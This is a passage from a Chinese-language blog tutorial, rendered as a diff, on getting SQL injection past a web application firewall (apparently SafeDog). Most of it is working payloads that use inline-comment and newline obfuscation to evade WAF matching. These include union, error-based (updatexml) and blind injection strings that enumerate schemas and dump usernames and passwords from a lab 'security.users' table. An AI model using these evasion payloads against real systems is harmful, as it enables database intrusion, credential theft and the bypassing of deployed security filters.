+<h2 id="6-获取对应表的字段信息"><a href="#6-获取对应表的字段信息" class="headerlink" title="6.获取对应表的字段信息"></a>6.获取对应表的字段信息</h2><p>通过内联注释以及换行获取到对应数据库的对应表的字段名。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- payload	0x7365637572697479=security	0x7573657273=users</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and /*//--/*/1=2 union /*//--/*/select 1,2,group_concat(column_name) /*//--/*/from /*!--+/*%0ainformation_schema.columns*/ where table_schema=0x7365637572697479 and table_name=/*//--/*/0x7573657273 -- x</span></span><br></pre></td></tr></table></figure>
+
+ <img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930174713158.png" class="">
+
+<h2 id="7-获取对应表的信息"><a href="#7-获取对应表的信息" class="headerlink" title="7.获取对应表的信息"></a>7.获取对应表的信息</h2><p>使用基本的绕过手段获取对应数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- payload</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and /*//--/*/ 1=2  union /*//--/*/ select 1,group_concat(id),group_concat(username,0x7e,password) /*//--/*/from security.users -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930175703753.png" class="">
+
+<h1 id="4）绕狗扩展-报错，盲注"><a href="#4）绕狗扩展-报错，盲注" class="headerlink" title="4）绕狗扩展(报错，盲注)"></a>4）绕狗扩展(报错，盲注)</h1><h2 id="1-报错"><a href="#1-报错" class="headerlink" title="1.报错"></a>1.报错</h2><blockquote>
+<p>获取对应数据库名</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用/*//--/*/可以绕过安全狗的很多匹配规则</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and updatexml/*//--/*/(1,concat(0x7e,database/*//--/*/()),1)-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取对应数据库的表信息</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 还是老样子，使用换行法+内联法组合</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and updatexml/*//--/*/(1,concat(0x7e,(select table_name from/*!--+/*%0ainformation_schema.tables*//*//--/*/ where table_schema=0x7365637572697479 limit 0,1)),1)-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取对应数据库的表的字段信息</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--	同样的手段绕过 修改limit可以获取其他列名</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and updatexml/*//--/*/(1,concat(0x7e,(select column_name from/*!--+/*%0ainformation_schema.columns*//*//--/*/ where table_schema=0x7365637572697479 and /*//--/*/table_name=0x7573657273 limit 0,1)),1)-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取对应表的数据</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 切换字段名以及limit的值获取全部内容</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and updatexml/*//--/*/(1,concat(0x7e,(select username from/*!--+/*%0asecurity.users*/ /*//--/*/limit 0,1)),1)-- x</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-盲注"><a href="#2-盲注" class="headerlink" title="2.盲注"></a>2.盲注</h2><blockquote>
+<p>获取数据库名长度</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--	常规方法获取名字长度并进行对比</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and /*//--/*/length(database/*//--/*/())=8-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取数据库名</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过修改substr函数的值以及后面对比的值获取到对应的数据库名</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and /*//--/*/ascii(substr(database/*//--/*/(),1,1))=115-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取数据库里面表的个数</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and /*//--/*/(select count(table_name) /*//--/*/from /*!-- x/*%0ainformation_schema.tables*/ where table_schema=0x7365637572697479)=4-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取数据库的所有表</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and /*//--/*/(select ascii(substr(table_name ,1,1))/*//--/*/from /*!-- x/*%0ainformation_schema.tables*/ where table_schema=0x7365637572697479 limit 0,1)=101-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取数据库对应表的字段长度</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and /*//--/*/(select count(column_name) /*//--/*/from /*!-- x/*%0ainformation_schema.columns*/ where table_schema=0x7365637572697479 and /*//--/*/ table_name=0x7573657273)=3-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取数据库对应表的字段名</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and /*//--/*/(select ascii(substr(column_name,1,1)) /*//--/*/from /*!-- x/*%0ainformation_schema.columns*/ where table_schema=0x7365637572697479 and /*//--/*/ table_name=0x7573657273 limit 0,1)=105-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取对应数据库的对应表的数据长度</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and /*//--/*/(select count(*) /*//--/*/from /*!-- x/*%0asecurity.users*/ limit 0,1)=13-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取对应的数据的长度</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and /*//--/*/(select length(username) /*//--/*/from /*!-- x/*%0asecurity.users*/ limit 0,1)=4-- x</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>获取对应的数据</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and /*//--/*/(select ascii(substr(username,1,1)) /*//--/*/from /*!-- x/*%0asecurity.users*/ limit 0,1)=68-- x</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/24/%E5%BC%80%E5%8F%91/%E9%A1%B9%E7%9B%AE/%E5%89%8D%E7%AB%AF%E6%8E%A5%E5%8F%A3%E9%9C%80%E6%B1%82%E6%96%87%E6%A1%A3/" rel="prev" title="前端接口需求文档">
+                  <i class="fa fa-chevron-left"></i> 前端接口需求文档
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xf</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
